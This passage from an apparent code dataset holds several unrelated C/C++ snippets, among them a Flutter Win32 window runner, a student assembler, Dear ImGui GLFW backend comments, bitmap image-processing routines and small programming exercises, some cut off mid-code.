CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "// /*****************************************************************************\n// TITLE: Assembler.cpp\n// AUTHOR: Sahil Agrawal (2101CS69)\n// Declaration of Authorship\n// This file is part of the assignment of CS209 at the\n// department of Computer Science and Engineering, IIT Patna.\n// *****************************************************************************/\n\n#include <bits/stdc++.h>\n#include <fstream>\n#include <cmath>\n#include <chrono>\n#include <numeric>\n\nusing namespace std;\n#define fasterio ios_base::sync_with_stdio(0),cin.tie(0),cout.tie(0);\n#define endl \"\\n\"\n#define ll long long\n#define testcase int t; cin>>t; for(int i=0;i<t;i++)\n#define INF 1e5\n\n string asmfile;\n   string lgfile;\n   string mcfile;\n   string lsfile;\n\n//IT IS ASSUMED THAT ALL FUNCTIONS ALLOW INTEGER and String of label.. but is not allowed for DATA\n\nvector<pair<string,ll>> functions={{\"ldc\",0},{\"adc\",1}\n,{\"ldl\",2},{\"stl\",3},{\"ldnl\",4},{\"stnl\",5},{\"add\",6},{\"sub\",7},\n{\"shl\",8},{\"shr\",9},{\"adj\",10},{\"a2sp\",11},{\"sp2a\",12},{\"call\",13},\n{\"return\",14},{\"brz\",15},{\"brlz\",16},{\"br\",17},{\"HALT\",18},{\"data\",19},{\"SET\",20}};\n\nset<string> double_labels;\nmap<string,ll> label_with_address;\nvector<string> pass2;\n//THIS ONE IS BEST ONE\nmap<string,ll> address_of_label;\n\n//ALL THE ERRORS\n//  ALL THE ERRORS are written on the place where i have added errors\n//\nll err_1=0;\nvector<ll> line_err_1;\n//\nll err_2=0;\nvector<ll> line_err_2;\n//\nll err_3=0;\nvector<ll> line_err_3;\n//\nll err_4=0;\nvector<ll> line_err_4;\n//\nll err_5=0;\nvector<ll> line_err_5;\n//\nll err_6=0;\nvector<ll> line_err_6;\n//\nll err_7=0;\nvector<ll> line_err_7;\n//\nll err_8=0;\nvector<ll> line_err_8;\n//\nll err_9=0;\nvector<ll> line_err_9;\n//\nll err_10=0;\nvector<ll> line_err_10;\n//\nll err_11=0;\nvector<ll> line_err_11;\n//Before Set there is no label\nll err_12=0;\nvector<ll> line_err_12;\n//NO HALT\nll warn_1=0;\n//Multiple labels for same pc address\nll warn_2=0;\nvector<ll>line_warn_2;\n\nll colon_finder(string s)\n{\n   ll length=s.size();\n   ll find=0;\n   for(ll i=0;i<length;i++)\n   {\n      if(s[i]==':')find=i;\n   }\n   return find;\n}\n\n\nvoid pass1(vector<string>&pass1str,vector<ll>&line_containing_colon,vector<ll>&line_containing_semicolon)\n{\n\n\n// all label ERRORS\n   \n\n   //err2:-    :xyz (no label name : direct)\n   for(ll i=0;i<pass1str.size();i++)\n   {\n      for(ll j=0;j<pass1str[i].size();j++)\n      {\n         if(pass1str[i][j]==' ') continue;\n         else {\n            if (pass1str[i][j]==':')\n            {\n               err_2=1; line_err_2.push_back(i+1);\n               break;\n            }\n            else break;\n         }\n      }\n   }\n   //err3:- number starting label\n   for(ll i=0;i<pass1str.size();i++)\n   {\n      if(line_containing_colon[i]==0) continue;\n      \n      {\n         for(ll j=0;j<pass1str[i].size();j++)\n         {\n            if(pass1str[i][j]==' ') continue;\n            else {\n               if(isalpha(pass1str[i][j]==0))\n                  {err_3=1; line_err_3.push_back(i+1);break;\n            }\n            else break;\n            \n\n         }\n      }\n   }}\n   //err4:- double colons in a string\n   for(ll i=0;i<pass1str.size();i++)\n   {\n     if(line_containing_colon[i]==0) continue;\n     ll count=0;\n     for(ll j=0;j<pass1str[i].size();j++)\n     {\n      if(pass1str[i][j]==':') count+=1;\n\n     }\n     if(count==2) {err_4=1;line_err_4.push_back(i+1);}\n\n\n   }\n\n   //err5/6 :- wrong label name or double labels\n   for(ll i=0;i<pass1str.size();i++)\n   {\n      string s;\n      if(line_containing_colon[i]==0) continue;\n      ll flag1=0;ll flag2=0;\n      for(ll j=0;j<pass1str[i].size();j++)\n      {\n         if(pass1str[i][j]==' '&&flag1==0&&flag2==0) continue;\n         else {\n            if(flag2==0){\n            flag1=1;\n            \n            \n            if(isalnum(pass1str[i][j])!=0||pass1str[i][j]=='_') {s.push_back(pass1str[i][j]);continue;}\n            else flag2=1;\n         }\n\n         if(flag2==1)\n         {\n\n\n\n            if(pass1str[i][j]==' ') continue;\n            if(pass1str[i][j]==':')break;\n            else {if(pass1str[i][j]!=':') {err_5=1;line_err_5.push_back(i+1);}\n\n            else break;}\n\n         }\n\n      }\n         \n\n\n      }\n      \n      if(double_labels.find(s)==double_labels.end()) double_labels.insert(s);\n      else {\n         err_6=1;\n         line_err_6.push_back(i+1);\n\n      }\n     \n      \n\n   }\n   //LABEL WITH ; and basically : ke aage wala part ke liye.\n   for(ll i=0;i<pass1str.size();i++)\n   {\n               ll flag1=0;ll flag2=0;ll flag3=0; ll flag4=0; string s;string number;\n\n      ll alpha=colon_finder(pass1str[i]);\n      if(line_containing_colon[i]==0) continue;\n      for(ll j=alpha+1;j<pass1str[i].size();j++)\n      {\n         if(pass1str[i][j]==' '&&flag1==0) {continue;}\n         else\n         {\n            if(flag2==0){\n            flag1=1;\n            if(pass1str[i][j]==' '||pass1str[i][j]==';') flag2=1;\n            else s.push_back(pass1str[i][j]);\n         }\n         else {\n            if(pass1str[i][j]==' '&&flag3==0) continue;\n            else",
    "// dear imgui: Platform Backend for GLFW\n// This needs to be used along with a Renderer (e.g. OpenGL3, Vulkan, WebGPU..)\n// (Info: GLFW is a cross-platform general purpose library for handling windows, inputs, OpenGL/Vulkan graphics context creation, etc.)\n// (Requires: GLFW 3.1+. Prefer GLFW 3.3+ or GLFW 3.4+ for full feature support.)\n\n// Implemented features:\n//  [X] Platform: Clipboard support.\n//  [X] Platform: Mouse support. Can discriminate Mouse/TouchScreen/Pen (Windows only).\n//  [X] Platform: Keyboard support. Since 1.87 we are using the io.AddKeyEvent() function. Pass ImGuiKey values to all key functions e.g. ImGui::IsKeyPressed(ImGuiKey_Space). [Legacy GLFW_KEY_* values will also be supported unless IMGUI_DISABLE_OBSOLETE_KEYIO is set]\n//  [X] Platform: Gamepad support. Enable with 'io.ConfigFlags |= ImGuiConfigFlags_NavEnableGamepad'.\n//  [X] Platform: Mouse cursor shape and visibility. Disable with 'io.ConfigFlags |= ImGuiConfigFlags_NoMouseCursorChange' (note: the resizing cursors requires GLFW 3.4+).\n\n// You can use unmodified imgui_impl_* files in your project. See examples/ folder for examples of using this.\n// Prefer including the entire imgui/ repository into your project (either as a copy or as a submodule), and only build the backends you need.\n// Learn about Dear ImGui:\n// - FAQ                  https://dearimgui.com/faq\n// - Getting Started      https://dearimgui.com/getting-started\n// - Documentation        https://dearimgui.com/docs (same as your local docs/ folder).\n// - Introduction, links and more at the top of imgui.cpp\n\n// CHANGELOG\n// (minor and older changes stripped away, please see git history for details)\n//  2023-12-19: Emscripten: Added ImGui_ImplGlfw_InstallEmscriptenCanvasResizeCallback() to register canvas selector and auto-resize GLFW window.\n//  2023-10-05: Inputs: Added support for extra ImGuiKey values: F13 to F24 function keys.\n//  2023-07-18: Inputs: Revert ignoring mouse data on GLFW_CURSOR_DISABLED as it can be used differently. User may set ImGuiConfigFLags_NoMouse if desired. (#5625, #6609)\n//  2023-06-12: Accept glfwGetTime() not returning a monotonically increasing value. This seems to happens on some Windows setup when peripherals disconnect, and is likely to also happen on browser + Emscripten. (#6491)\n//  2023-04-04: Inputs: Added support for io.AddMouseSourceEvent() to discriminate ImGuiMouseSource_Mouse/ImGuiMouseSource_TouchScreen/ImGuiMouseSource_Pen on Windows ONLY, using a custom WndProc hook. (#2702)\n//  2023-03-16: Inputs: Fixed key modifiers handling on secondary viewports (docking branch). Broken on 2023/01/04. (#6248, #6034)\n//  2023-03-14: Emscripten: Avoid using glfwGetError() and glfwGetGamepadState() which are not correctly implemented in Emscripten emulation. (#6240)\n//  2023-02-03: Emscripten: Registering custom low-level mouse wheel handler to get more accurate scrolling impulses on Emscripten. (#4019, #6096)\n//  2023-01-04: Inputs: Fixed mods state on Linux when using Alt-GR text input (e.g. German keyboard layout), could lead to broken text input. Revert a 2022/01/17 change were we resumed using mods provided by GLFW, turns out they were faulty.\n//  2022-11-22: Perform a dummy glfwGetError() read to cancel missing names with glfwGetKeyName(). (#5908)\n//  2022-10-18: Perform a dummy glfwGetError() read to cancel missing mouse cursors errors. Using GLFW_VERSION_COMBINED directly. (#5785)\n//  2022-10-11: Using 'nullptr' instead of 'NULL' as per our switch to C++11.\n//  2022-09-26: Inputs: Renamed ImGuiKey_ModXXX introduced in 1.87 to ImGuiMod_XXX (old names still supported).\n//  2022-09-01: Inputs: Honor GLFW_CURSOR_DISABLED by not setting mouse position *EDIT* Reverted 2023-07-18.\n//  2022-04-30: Inputs: Fixed ImGui_ImplGlfw_TranslateUntranslatedKey() for lower case letters on OSX.\n//  2022-03-23: Inputs: Fixed a regression in 1.87 which resulted in keyboard modifiers events being reported incorrectly on Linux/X11.\n//  2022-02-07: Added ImGui_ImplGlfw_InstallCallbacks()/ImGui_ImplGlfw_RestoreCallbacks() helpers to facilitate user installing callbacks after initializing backend.\n//  2022-01-26: Inputs: replaced short-lived io.AddKeyModsEvent() (added two weeks ago) with io.AddKeyEvent() using ImGuiKey_ModXXX flags. Sorry for the confusion.\n//  2021-01-20: Inputs: calling new io.AddKeyAnalogEvent() for gamepad support, instead of writing directly to io.NavInputs[].\n//  2022-01-17: Inputs: calling new io.AddMousePosEvent(), io.AddMouseButtonEvent(), io.AddMouseWheelEvent() API (1.87+).\n//  2022-01-17: Inputs: always update key mods next and before key event (not in NewFrame) to fix input queue with very low framerates.\n//  2022-01-12: *BREAKING CHANGE*: Now using glfwSetCursorPosCallback(). If you called ImGui_ImplGlfw_InitXXX() with install_callbacks = false, you MUST install glfwSetCursorPosCallback() and forward it to the backend via ImGui_ImplGlfw_CursorPosCallback().\n//  2022-01-10: Inputs: calling new io.AddKeyEvent(), io.AddKeyMod",
    "#pragma warning(disable : 4996)\n#include <stdio.h>\n#include <stdlib.h>\n#include <Windows.h>\n\nvoid InverseImage(BYTE* Img, BYTE* Out, int W, int H) \n{\n    int ImgSize = W * H;\n\n    for (int i = 0; i < ImgSize; i++)\n    {\n        Out[i] = 255 - Img[i];\n    }\n}\n\nvoid BrightnessAdj(BYTE* Img, BYTE* Out, int W, int H, int Val)\n{\n    int ImgSize = W * H;\n\n    for (int i = 0; i < ImgSize; i++)\n    {\n        if (Img[i] + Val > 255) \n        {\n            Out[i] = 255;\n        }\n        else if (Img[i] + Val < 0) \n        {\n            Out[i] = 0;\n        }\n        else \n        {\n            Out[i] = Img[i] + Val;\n        }\n        \n    }\n}\n\nvoid ContrastAdj(BYTE* Img, BYTE* Out, int W, int H, double Val)\n{\n    int ImgSize = W * H;\n\n    for (int i = 0; i < ImgSize; i++)\n    {\n        if (Img[i] * Val > 255.0)\n        {\n            Out[i] = 255;\n        }\n        else\n        {\n            Out[i] = (BYTE)(Img[i] * Val);//byte * double = double \uadf8\ub798\uc11c \uac15\uc81c \ud615 \ubcc0\ud658\n        }\n\n    }\n}\n\nvoid ObtainHistogram(BYTE* Img, int* Histo, int W, int H) {\n    int ImgSize = W * H;\n    \n\n    for (int i = 0;i < ImgSize;i++)\n    {\n        Histo[Img[i]]++;// \uc774\ubbf8\uc9c0\uc5d0 \ud574\ub2f9\ud558\ub294 \ud654\uc18c \uac12\uc774 \uc788\ub294\ub370 \uadf8\uac83\uc5d0 \ub300\ud55c index\uac12\uc744 \uc99d\uac00 \uc2dc\ud0b4\n    }\n}\n\nvoid HistogramStretching(BYTE* Img, BYTE* Out, int* Histo, int W, int H) {\n    // \uc2a4\ud2b8\ub798\uce6d \ubc29\uc2dd\n    int ImgSize = W * H;\n\n    BYTE Low = 0, High = 0;\n\n    for (int i = 0;i < 256;i++)\n    {\n        //if (Image[i] < Low) {\n        //    Low = Image[i];\n        //}\n        if (Histo[i] != 0) {\n            Low = i;\n            break;\n        }\n    }\n\n    for (int i = 255;i >= 0;i--)\n    {\n        if (Histo[i] != 0) {\n            High = i;\n            break;\n        }\n    }\n\n    for (int i = 0;i < ImgSize;i++) {\n        Out[i] = (BYTE)(Img[i] - Low) / (double)(High - Low) * 255.0;// Byte = 0 or 1 \uadf8\ub807\uae30 \ub54c\ubb38\uc5d0 \ub098\ub204\uba74 0 or 1 \uadf8\ub798\uc11c double\ub85c \ud615 \ubcc0\ud658\n    }\n}\n\nvoid ObtainAHistogram(int* Histo, int* AHisto) \n{\n    for (int i = 0; i < 256; i++) \n    {\n        for (int j = 0; j <= i; j++) \n        {\n            AHisto[i] += Histo[j];\n        }\n    }\n}\n\nvoid HistogramEqualization(BYTE* Img, BYTE* Out, int* AHisto, int W, int H) {\n    int ImgSize = W * H;\n\n    int Nt = W * H;\n    int Gmax = 255;// \uc601\uc0c1\uc774 \uac00\uc9c8 \uc218 \uc788\ub294 \ucd5c\ub300\ubc1d\uae30\n    double Ratio = Gmax / (double)Nt;\n    BYTE NormSum[256];// \uc815\uaddc\ud654\n    for (int i = 0;i < 256;i++) {\n        NormSum[i] = (BYTE)(Ratio * AHisto[i]);\n    }\n    for (int i = 0; i < ImgSize; i++)\n    {\n        Out[i] = NormSum[Img[i]];\n    }\n\n}\n\nvoid Binarization(BYTE* Img, BYTE* Out, int W, int H, BYTE Threshold) {\n    int ImgSize = W * H;\n\n    for (int i = 0;i < ImgSize;i++)\n    {\n        if (Img[i] < Threshold) {\n            Out[i] = 0;\n        }\n        else {\n            Out[i] = 255;\n        }\n    }\n}\n\nint GonzalezBinThresh(BYTE* Img, BYTE* Out, int W, int H, int* Histo)\n{\n    BYTE Low = 0, High = 255;\n\n    for (int i = 0; i < 256; i++)\n    {\n        if (Histo[i] != 0) {\n            Low = i;\n            break;\n        }\n    }\n\n    for (int i = 255; i >= 0; i--)\n    {\n        if (Histo[i] != 0) {\n            High = i;\n            break;\n        }\n    }\n\n    int T = (Low + High) / 2;\n    int T2 = 0;\n\n    do {\n        int Cnt1 = 0, Sum1 = 0;\n\n        for (int i = 0; i < T+1; i++) {\n            Cnt1 += Histo[i];\n            Sum1 += i * Histo[i];\n        }\n        int M1 = Sum1 / Cnt1;\n\n        int Cnt2 = 0, Sum2 = 0;\n\n        for (int i = T + 1; i < 256; i++) {\n            Cnt2 += Histo[i];\n            Sum2 += i * Histo[i];\n        }\n        int M2 = (Cnt2 == 0) ? 0 : Sum2 / Cnt2;\n\n        T2 = (M1 + M2) / 2;\n        T = T2;\n\n    } while (abs(T - T2) > 3);\n\n    return T;\n}\n\n\n\n\n\nint main()\n{\n    BITMAPFILEHEADER hf;    // 14bite\n    BITMAPINFOHEADER hInfo; // 40bite\n    RGBQUAD hRGB[256];      // 1024bite\n    FILE* fp;\n\n    fp = fopen(\"data/coin.bmp\", \"rb\");\n\n    if (fp == NULL)\n    {\n        printf(\"File not found!\\n\");\n        return -1;\n    }\n\n    fread(&hf, sizeof(BITMAPFILEHEADER), 1, fp); // \ud604\uc7ac \ud30c\uc77c\ud3ec\uc778\ud130\uc5d0\uc11c \ud55c \ubc88 \uc77d\uc5b4\uc628\ub2e4\n    fread(&hInfo, sizeof(BITMAPINFOHEADER), 1, fp);\n    fread(hRGB, sizeof(RGBQUAD), 256, fp);\n\n    int ImgSize = hInfo.biWidth * hInfo.biHeight;\n\n    BYTE* Image = (BYTE*)malloc(ImgSize); // \ub3d9\uc801 \ud560\ub2f9(0~255)\n    // BYTE Image[ImageSize] \uc774\ub7f0 \uc758\ubbf8\ub85c \uc0dd\uac01\ud558\uba74 \ub428\n    BYTE* Output = (BYTE*)malloc(ImgSize);\n    fread(Image, sizeof(BYTE), ImgSize, fp); // \uc774\ubbf8\uc9c0\uc758 \ud654\uc18c\uc815\ubcf4\n    fclose(fp);\n\n    \n    \n    //InverseImage(Image, Output, hInfo.biWidth, hInfo.biHeight);\n\n    //BrightnessAdj(Image, Output, hInfo.biWidth, hInfo.biHeight, 70);\n\n    //ContrastAdj(Image, Output, hInfo.biWidth, hInfo.biHeight, 1.5);\n\n    int Histo[256] = { 0 };// \uac01 \ud654\uc18c\ubcc4 \uac2f\uc218\ub97c \ubc30\uc5f4\uc5d0 \ucd94\uac00\ud568\n    int AHisto[256] = { 0 };// \ub204\uc801 \ud788\uc2a4\ud1a0 \uac12\n\n    ObtainHistogram(Image, Histo, hInfo.biWidth, hInfo.biHeight);// \ud788\uc2a4\ud1a0\uadf8\ub7a8\n    \n    ObtainAHistogram(Histo, AHisto);// \ub204\uc801 \ud788\uc2a4\ud1a0\uadf8\ub7a8\n     \n    //HistogramStretching(Image, Output, Histo, hInfo.biWidth, hInfo.biHeight);\n    \n    //HistogramEqualization(Image, Output, AHisto, hInfo.biWidth, hInfo.biHeight);\n    int Thres = GonzalezBinThresh(Image, Output, hInfo.biWidth, hInfo.biHeight, Histo);\n\n    B",
    "#include <iostream>\nusing namespace std;\n\nstruct DetailAlamat{\n    string desa;\n    string kota;\n};\nstruct Mahasiswa{\n    string nim;\n    string nama;\n    DetailAlamat alamat;\n    int umur;\n};\nint main(){\n    Mahasiswa mhs[3]; \n     for (int i = 0; i < 3; i++){\n        cout << \"Data ke- \" << (i+1) << \":\" << endl;\n        cout << \"Nomor Mahasiswa : \"; \n        getline(cin,mhs[i].nim);\n        cout << \"Nama Mahasiswa : \";\n        getline( cin, mhs[i].nama);\n\n        cout << \"Alamat Mahasiswa : \" << endl;\n        cout << \"\\t Nama Desa : \";\n        cin >> mhs[i].alamat.desa;\n        cout << \"\\t Nama Kota : \";\n        cin >> mhs[i].alamat.kota;\n        cout  << \"Umur Mahasiswa : \";\n        cin >> mhs[i].umur;\n        cin.ignore(1,'\\n');\n        cout << endl;\n     }\n      for(int i = 0; i < 3; i++){\n        cout << endl;\n        cout << \"Data Mahasiswa ke- \" << (i+1) << \":\" << endl;\n        cout << \"\\n NIM : \" << mhs[i]. nim;\n        cout << \"\\n Nama : \" << mhs[i].nama;\n        cout << \"\\n Alamat : \" ;\n        cout << \"\\n Desa : \" << mhs[i].alamat.desa;\n        cout << \"\\n Kota : \" << mhs[i].alamat.kota;\n        cout << \"\\n Umur : \" << mhs[i].umur;\n\n    }\n\n\n}",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "\ufeff#include <iostream>\n\nusing namespace std;\n\nint main() {\n    int matrix[5][5];\n    cout << \"Please enter numbers for matrix\\n\";\n    for (int i = 0; i < 5; i++) {\n        for (int j = 0; j < 5; j++) {\n            cin >> matrix[i][j];\n        }\n    }\n\n    int inverseMatrix[5][5];\n    for (int i = 0; i < 5; i++) {\n        for (int j = 0; j < 5; j++) {\n            inverseMatrix[i][j] = (matrix[j][i] != 0) ? 1 / matrix[j][i] : 0;\n        }\n    }\n\n    int minElements[5];\n    for (int i = 0; i < 5; i++) {\n        int minElement = matrix[i][0];\n        for (int j = 1; j < 5; j++) {\n            if (matrix[i][j] < minElement) {\n                minElement = matrix[i][j];\n            }\n        }\n        minElements[i] = minElement;\n    }\n\n    for (int i = 0; i < 5; i++) {\n        for (int j = i + 1; j < 5; j++) {\n            if (minElements[i] < minElements[j]) {\n                swap(minElements[i], minElements[j]);\n            }\n        }\n    }\n\n    for (int i = 0; i < 5; i++) {\n        for (int j = 0; j < 5; j++) {\n            cout << matrix[i][j] << \" \";\n        }\n        cout << endl;\n    }\n\n    cout << endl;\n\n    for (int i = 0; i < 5; i++) {\n        for (int j = 0; j < 5; j++) {\n            cout << inverseMatrix[i][j] << \" \";\n        }\n        cout << endl;\n    }\n\n    cout << endl;\n\n    for (int i = 0; i < 5; i++) {\n        cout << minElements[i] << \" \";\n    }\n    cout << endl;\n\n    return 0;\n}\n",
    "#include <iostream>\n#include <cstdlib>\nusing namespace std;\n\nclass Array{\n    private:\n        int arr[100],temp,last;\n        int size = sizeof(arr);\n        int len = size/4;\n    public:\n        Array(int n){\n            for(int i=0;i<n;i++){\n                arr[i] = rand() % 1000;\n            }\n            last = n;\n        }\n        int Get(int i){\n            return arr[i];\n        }\n        void Replace(int a, int i){\n            arr[i] = a;\n        }\n        void Traverse(){\n            for(int i=0;i<last;i++){\n                cout<<arr[i]<<\"\\t\";\n            }\n            cout<<endl;\n        }\n        void Insert(int a, int i){\n            if(len>i&&i>last){\n                arr[i] = a;\n            }\n            else if(i<len&&!(arr[len-1])){\n                for(int j = len;j>=i;j--){\n                    if(arr[j-1]){\n                        arr[j] = arr[j-1];\n                    }   \n                }\n                arr[i] = a;\n            }\n            else if(i>=len){\n                cout<<\"Insertion Failed: Index Out of Range\"<<endl;\n            }\n            else if(arr[len-1]){\n                cout<<\"Insertion Failed: Array is Full\"<<endl;\n            }\n        }\n        void Push(int a){\n            if(last >= len){\n                cout<<\"Push Failed: Array is Full\"<<endl;\n            }\n            else{\n                arr[last] = a;\n            }\n        }\n        void Remove(int i){\n            while(arr[i+1]){\n                arr[i] = arr[i+1];\n                i++;\n            }\n        }\n        void Sort(){\n            for(int i=0;i<last;i++){\n                for(int j=i;j<last;j++){\n                    if(arr[i]>arr[j]){\n                        temp = arr[i];\n                        arr[i] = arr[j];\n                        arr[j] = temp;\n                    }\n                }\n            }\n            cout<<\"Array Sorted.\"<<endl;\n        }\n        void Selection_Search(int a){\n            for(int i = 0; i<last ; i++){\n                if(arr[i] == a){\n                    cout<<\"Element is on Index: \"<<i<<endl;\n                    return;\n                }\n            }\n            cout<<\"Element not Found.\"<<endl;\n        }\n        void Binary_Search(int a){\n            int max = last-1, min = 0, mid = (max+min)/2;\n            while(max>=min){\n                if(arr[mid] == a){\n                    cout<<\"Element is on Index: \"<<mid<<endl;\n                    return;\n                }\n                if(a>arr[mid]){\n                    min = mid+1;\n                    mid = (min+max)/2;\n                }\n                else{\n                    max = mid-1;\n                    mid = (min+max)/2;\n                }\n            };\n            cout<<\"Element not Found.\"<<endl;\n        }\n};\n\nint main(){\n    Array array(30);\n    array.Traverse();\n    array.Insert(2,10);\n    array.Push(9);\n    array.Remove(8);\n    array.Traverse();\n    array.Sort();\n    array.Traverse();\n    array.Selection_Search(334);\n    array.Binary_Search(391);\n    return 0;\n}",
    "#include <iostream>\n#include <vector>\n#include <algorithm>\nusing namespace std;\n\nint main() {\n    int H, W, N;\n    cin >> H >> W >> N;\n    string T;\n    cin >> T;\n    vector<string> S(H);\n    for (int i = 0; i < H; i++) {\n        cin >> S[i];\n    }\n\n    int patternCount = 0;\n\n    for (int i = 0; i < H; i++) {\n        for (int j = 0; j < W; j++) {\n            if (S[i][j] != '.') continue;\n\n            bool isPattern = true;\n            int x = j, y = i;\n\n            for (int i = 0; i < T.length(); i++) {\n                char c = T[i];\n                if (c == 'L') {\n                    x--;\n                } else if (c == 'R') {\n                    x++;\n                } else if (c == 'U') {\n                    y--;\n                } else if (c == 'D') {\n                    y++;\n                }\n                if (y >= 0 && y < H && x >= 0 && x < W) {\n                    if (S[y][x] != '.') {\n                        isPattern = false;\n                        break;\n                    }\n                } else {\n                    isPattern = false;\n                    break;\n                }\n            }\n\n            if (isPattern) {\n                patternCount++;\n            }\n        }\n    }\n\n    cout << patternCount << 